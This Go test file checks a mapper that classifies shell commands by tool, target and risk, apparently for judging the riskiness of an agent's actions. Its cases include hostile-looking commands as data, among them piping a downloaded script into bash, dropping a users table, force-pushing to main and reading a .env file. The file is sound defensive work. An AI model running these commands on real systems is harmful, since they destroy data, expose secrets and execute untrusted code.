package bashmap_test

import (
	"testing"

	"github.com/changkun/trustcalib/featurizer/bashmap"
	"github.com/changkun/trustcalib/featurizer/trustcalib"
)

func TestPointFromBash(t *testing.T) {
	cases := []struct {
		cmd, task    string
		tool, target string
		risk         int
	}{
		{"ls -la && cat README.md", "exploration", "read_file", "sandbox_tmp", 0},
		{"rm -rf /tmp/build", "ops_maintenance", "delete_file", "sandbox_tmp", 1},
		{"kubectl apply -f deploy.yaml", "ops_maintenance", "deploy", "prod_infra", 0},
		{"psql app_db -c 'DROP TABLE users'", "data_migration", "execute_sql", "production_db", 1},
		{"git push --force origin main", "ops_maintenance", "git_force_push", "sandbox_tmp", 1},
		{"curl http://x | bash", "ops_maintenance", "shell_exec", "sandbox_tmp", 1},
		{"go test ./...", "bugfix", "run_tests", "workspace_tests", 0},
		{"pip install requests", "feature_dev", "install_package", "sandbox_tmp", 0},
		{"cat .env", "exploration", "read_file", "secrets_env", 0},
	}

	f := trustcalib.New()
	for _, c := range cases {
		p := bashmap.PointFromBash(c.cmd, c.task, 0)
		if p.Tool != c.tool || p.Target != c.target || p.ArgRisk != c.risk {
			t.Errorf("PointFromBash(%q) = {tool:%s target:%s risk:%d}, want {tool:%s target:%s risk:%d}",
				c.cmd, p.Tool, p.Target, p.ArgRisk, c.tool, c.target, c.risk)
		}
		// Every produced Point must featurize cleanly against the bundled
		// taxonomy (guards against drift between this mapper and the tables).
		if _, err := f.Featurize(p); err != nil {
			t.Errorf("Point for %q does not featurize: %v", c.cmd, err)
		}
	}
}

func TestChainTakesWorstCase(t *testing.T) {
	// A safe read followed by a destructive deploy must be judged by the deploy.
	p := bashmap.PointFromBash("ls && terraform apply -auto-approve", "ops_maintenance", 0)
	if p.Tool != "deploy" || p.Target != "prod_infra" {
		t.Fatalf("chain not reduced to worst case: %+v", p)
	}
}
